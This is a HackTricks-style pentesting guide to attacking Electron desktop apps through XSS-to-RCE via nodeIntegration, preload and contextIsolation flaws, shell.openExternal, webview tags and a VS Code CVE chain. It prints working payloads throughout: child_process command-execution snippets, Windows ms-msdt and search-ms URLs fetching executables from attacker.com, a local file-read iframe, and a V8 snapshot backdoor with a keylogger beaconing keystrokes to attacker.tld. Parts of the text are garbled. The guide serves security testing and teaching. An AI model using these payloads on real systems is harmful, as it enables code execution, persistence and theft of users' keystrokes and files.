# Electron Desktop Apps

{{#include ../../../banners/hacktricks-training.md}}

## Introduction

Electron combines a local backend (with **NodeJS**) and a frontend (**Chromium**), although tt lacks some the security mechanisms of modern browsers.

Usually you might find the electron app code inside an `.asar` application, in order to obtain the code you need to extract it:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

In the source code of an Electron app, inside `packet.json`, you can find specified the `main.js` file where security configs ad set.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron has 2 process types:

- Main Process (has complete access to NodeJS)
- Renderer Process (should have NodeJS restricted access for security reasons)

![](<../../../images/image (182).png>)

A **renderer process** will be a browser window loading a file:

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

Settings of the **renderer process** can be **configured** in the **main process** inside the main.js file. Some of the configurations will **prevent the Electron application to get RCE** or other vulnerabilities if the **settings are correctly configured**.

The electron application **could access the device** via Node apis although it can be configure to prevent it:

- **`nodeIntegration`** - is `off` by default. If on, allows to access node features from the renderer process.
- **`contextIsolation`** - is `on` by default. If off, main and renderer processes aren't isolated.
- **`preload`** - empty by default.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - is off by default. It will restrict the actions NodeJS can perform.
- Node Integration in Workers
- **`nodeIntegrationInSubframes`**- is `off` by default.
  - If **`nodeIntegration`** is **enabled**, this would allow the use of **Node.js APIs** in web pages that are **loaded in iframes** within an Electron application.
  - If **`nodeIntegration`** is **disabled**, then preloads will load in the iframe

Example of configuration:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Some **RCE payloads** from [here](https://7as.es/electron/nodeIntegration_rce.txt):

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Capture traffic

Modify the start-main configuration and add the use of a proxy such as:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Electron Local Code Injection

If you can execute locally an Electron App it's possible that you could make it execute arbitrary javascript code. Check how in:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

If the **nodeIntegration** is set to **on**, a web page's JavaScript can use Node.js features easily just by calling the `require()`. For example, the way to execute the calc application on Windows is:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

The script indicated in this setting is l**oaded before other scripts in the renderer**, so it has **unlimited access to Node APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Therefore, the script can export node-features to pages:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **If `contextIsolation` is on, this won't work**

## RCE: XSS + contextIsolation

The _**contextIsolation**_ introduces the **separated contexts between the web page scripts and the JavaScript Electron's internal code** so that the JavaScript execution of each code does not affect each. This is a necessary feature to eliminate the possibility of RCE.

If the contexts aren't isolated an attacker can:

1. Execute **arbitrary JavaScript in renderer** (XSS or navigation to external sites)
2. **Overwrite the built-in method** which is used in preload or Electron internal code to own function
3. **Trigger** the use of **overwritten function**
4. RCE?

There are 2 places where built-int methods can be overwritten: In preload code or in Electron internal code:

{{#endref}}

### Bypass click event

If there are restrictions applied when you click a link you might be able to bypass them **doing a middle click** instead of a regular left click

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

For more info about this examples check [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) and [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

When deploying an Electron desktop application, ensuring the correct settings for `nodeIntegration` and `contextIsolation` is crucial. It's established that **client-side remote code execution (RCE)** targeting preload scripts or Electron's native code from the main process is effectively prevented with these settings in place.

Upon a user interacting with links or opening new windows, specific event listeners are triggered, which are crucial for the application's security and functionality:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

These listeners are **overridden by the desktop application** to implement its own **business logic**. The application evaluates whether a navigated link should be opened internally or in an external web browser. This decision is typically made through a function, `openInternally`. If this function returns `false`, it indicates that the link should be opened externally, utilizing the `shell.openExternal` function.

**Here is a simplified pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS security best practices advise against accepting untrusted content with the `openExternal` function, as it could lead to RCE through various protocols. Operating systems support different protocols that might trigger RCE. For detailed examples and further explanation on this topic, one can refer to [this resource](https://positive.security/blog/url-open-rce#windows-10-19042), which includes Windows protocol examples capable of exploiting this vulnerability.

In macos, the `openExternal` function can be exploited to execute arbitrary commands like in `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Examples of Windows protocol exploits include:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

This vuln can be found in **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

The **webviewTag** is a **deprecated feature** that allows the use of **NodeJS** in the **renderer process**, which should be disabled as it allows to load a script inside the preload context like:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Therefore, an attacker that manages to load an arbitrary page could use that tag to **load an arbitrary preload script**.

This preload script was abused then to call a **vulnerable IPC service (`skype-new-window`)** which was calling calling **`shell.openExternal`** to get RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Reading Internal Files: XSS + contextIsolation

**Disabling `contextIsolation` enables the use of `<webview>` tags**, similar to `<iframe>`, for reading and exfiltrating local files. An example provided demonstrates how to exploit this vulnerability to read the contents of internal files:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Further, another method for **reading an internal file** is shared, highlighting a critical local file read vulnerability in an Electron desktop app. This involves injecting a script to exploit the application and exfiltrate data:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Old Chromium**

If the **chromium** used by the application is **old** and there are **known** **vulnerabilities** on it, it might be possible to to **exploit it and obtain RCE through a XSS**.\
You can see an example in this **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Supposing you found a XSS but you **cannot trigger RCE or steal internal files** you could try to use it to **steal credentials via phishing**.

First of all you need to know what happen when you try to open a new URL, checking the JS code in the front-end:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

The call to **`openInternally`** will decide if the **link** will be **opened** in the **desktop window** as it's a link belonging to the platform, **or** if will be opened in the **browser as a 3rd party resource**.

In the case the **regex** used by the function is **vulnerable to bypasses** (for example by **not escaping the dots of subdomains**) an attacker could abuse the XSS to **open a new window which** will be located in the attackers infrastructure **asking for credentials** to the user:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` Protocol

As mentioned in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) pages running on **`file://`** have unilateral access to every file on your machine meaning that **XSS issues can be used to load arbitrary files** from the users machine. Using a **custom protocol** prevents issues like this as you can limit the protocol to only serving a specific set of files.

## Remote module

The Electron Remote module allows **renderer processes to access main process APIs**, facilitating communication within an Electron application. However, enabling this module introduces significant security risks. It expands the application's attack surface, making it more susceptible to vulnerabilities such as cross-site scripting (XSS) attacks.

> [!TIP]
> Although the **remote** module exposes some APIs from main to renderer processes, it's not straight forward to get RCE just only abusing the components. However, the components might expose sensitive information.

> [!WARNING]
> Many apps that still use the remote module do it in a way that **require NodeIntegration to be enabled** in the renderer process, which is a **huge security risk**.

Since Electron 14 the `remote` module of Electron might be enabled in several steops cause due to security and performance reasons it's **recommended to not use it**.

To enable it, it'd first needed to **enable it in the main process**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Then, the renderer process can import objects from the module it like:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

The **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** indicates some interesting **functions** exposed by the object **`app`** from the remote module:

- **`app.relaunch([options])`**  
   - **Restarts** the application by **exiting** the current instance and **launching** a new one. Useful for **app updates** or significant **state changes**.
- **`app.setAppLogsPath([path])`**  
   - **Defines** or **creates** a directory for storing **app logs**. The logs can be **retrieved** or **modified** using **`app.getPath()`** or **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registers** the current executable as the **default handler** for a specified **protocol**. You can provide a **custom path** and **arguments** if needed.
- **`app.setUserTasks(tasks)`**  
   - **Adds** tasks to the **Tasks category** in the **Jump List** (on Windows). Each task can control how the app is **launched** or what **arguments** are passed.
- **`app.importCertificate(options, callback)`**  
   - **Imports** a **PKCS#12 certificate** into the system’s **certificate store** (Linux only). A **callback** can be used to handle the result.
- **`app.moveToApplicationsFolder([options])`**  
   - **Moves** the application to the **Applications folder** (on macOS). Helps ensure a **standard installation** for Mac users.
- **`app.setJumpList(categories)`**  
   - **Sets** or **removes** a **custom Jump List** on **Windows**. You can specify **categories** to organize how tasks appear to the user.
- **`app.setLoginItemSettings(settings)`**  
   - **Configures** which **executables** launch at **login** along with their **options** (macOS and Windows only).
  
Example:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences module

The **primary API** for accessing system preferences and **emitting system events** in Electron. Methods like **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, and **setUserDefault** are all **part of** this module.

**Example usage:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Listens** for **native macOS notifications** using NSDistributedNotificationCenter.  
* Before **macOS Catalina**, you could sniff **all** distributed notifications by passing **nil** to CFNotificationCenterAddObserver.  
* After **Catalina / Big Sur**, sandboxed apps can still **subscribe** to **many events** (for example, **screen locks/unlocks**, **volume mounts**, **network activity**, etc.) by registering notifications **by name**.

### **getUserDefault / setUserDefault**

* **Interfaces** with **NSUserDefaults**, which stores **application** or **global** preferences on macOS.
    
* **getUserDefault** can **retrieve** sensitive information, such as **recent file locations** or **user’s geographic location**.
    
* **setUserDefault** can **modify** these preferences, potentially affecting an app’s **configuration**.
    
* In **older Electron versions** (before v8.3.0), only the **standard suite** of NSUserDefaults was **accessible**.

## Shell.showItemInFolder

This function whows the given file in a file manager, which **could automatically execute the file**.

## Content Security Policy

Electron apps should have a **Content Security Policy (CSP)** to **prevent XSS attacks**. The **CSP** is a **security standard** that helps **prevent** the **execution** of **untrusted code** in the browser.

It's usually **configured** in the **`main.js`** file or in the **`index.html`** template with the CSP inside a **meta tag**.

## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

This real-world chain affected Visual Studio Code 1.63 (CVE-2021-43908) and demonstrates how a single markdown-driven XSS in a webview can be escalated to full RCE when CSP, postMessage, and scheme handlers are misconfigured. Public PoC: https://github.com/Sudistark/vscode-rce-electrovolt

Attack chain overview
- First XSS via webview CSP: The generated CSP included `style-src 'self' 'unsafe-inline'`, allowing inline/style-based injection in a `vscode-webview://` context. The payload beaconed to `/stealID` to exfiltrate the target webview’s extensionId.
- Constructing target webview URL: Using the leaked ID to build `vscode-webview://<extensionId>/.../<publicUrl>`.
- Second XSS via postMessage trust: The outer webview trusted `window.postMessage` without strict origin/type checks and loaded attacker HTML with `allowScripts: true`.
- Local file loading via scheme/path rewriting: The payload rewrote `file:///...` to `vscode-file://vscode-app/...` and swapped `exploit.md` for `RCE.html`, abusing weak path validation to load a privileged local resource.
- RCE in Node-enabled context: The loaded HTML executed with Node APIs available, yielding OS command execution.

Example RCE primitive in the final context
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron and Chromium-based apps deserialize a prebuilt V8 heap snapshot at startup (v8_context_snapshot.bin, and optionally browser_v8_context_snapshot.bin) to initialize each V8 isolate (main, preload, renderer). Historically, Electron’s integrity fuses did not treat these snapshots as executable content, so they escaped both fuse-based integrity enforcement and OS code-signing checks. As a result, replacing the snapshot in a user-writable installation provided stealthy, persistent code execution inside the app without modifying the signed binaries or ASAR.

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation and OnlyLoadAppFromAsar validate app JavaScript inside the ASAR, but they did not cover V8 heap snapshots (CVE-2025-55305). Chromium similarly does not integrity-check snapshots.
- Attack preconditions: Local file write into the app’s installation directory. This is common on systems where Electron apps or Chromium browsers are installed under user-writable paths (e.g., %AppData%\Local on Windows; /Applications with caveats on macOS).
- Effect: Reliable execution of attacker JavaScript in any isolate by clobbering a frequently used builtin (a “gadget”), enabling persistence and evasion of code-signing verification.
- Affected surface: Electron apps (even with fuses enabled) and Chromium-based browsers that load snapshots from user-writable locations.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Isolate-aware payload routing (run different code in main vs. renderer)
- Main process detection: Node-only globals like process.pid, process.binding(), or process.dlopen are present in the main process isolate.
- Browser/renderer detection: Browser-only globals like alert are available when running in a document context.

Example gadget that probes main-process Node capabilities once
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

Renderer/browser-context data theft PoC (e.g., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Operator workflow
1) Write payload.js that clobbers a common builtin (e.g., Array.isArray) and optionally branches per isolate.
2) Build the snapshot without Chromium sources:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Overwrite the target application’s snapshot file(s):
   - v8_context_snapshot.bin (always used)
   - browser_v8_context_snapshot.bin (if the LoadBrowserProcessSpecificV8Snapshot fuse is used)
4) Launch the application; the gadget executes whenever the chosen builtin is used.

Notes and considerations
- Integrity/signature bypass: Snapshot files are not treated as native executables by code-signing checks and (historically) were not covered by Electron’s fuses or Chromium integrity controls.
- Persistence: Replacing the snapshot in a user-writable install typically survives app restarts and looks like a signed, legitimate app.
- Chromium browsers: The same tampering concept applies to Chrome/derivatives installed in user-writable locations. Chrome has other integrity mitigations but explicitly excludes physically local attacks from its threat model.

Detection and mitigations
- Treat snapshots as executable content and include them in integrity enforcement (CVE-2025-55305 fix).
- Prefer admin-writable-only install locations; baseline and monitor hashes for v8_context_snapshot.bin and browser_v8_context_snapshot.bin.
- Detect early-runtime builtin clobbering and unexpected snapshot changes; alert when deserialized snapshots do not match expected values.
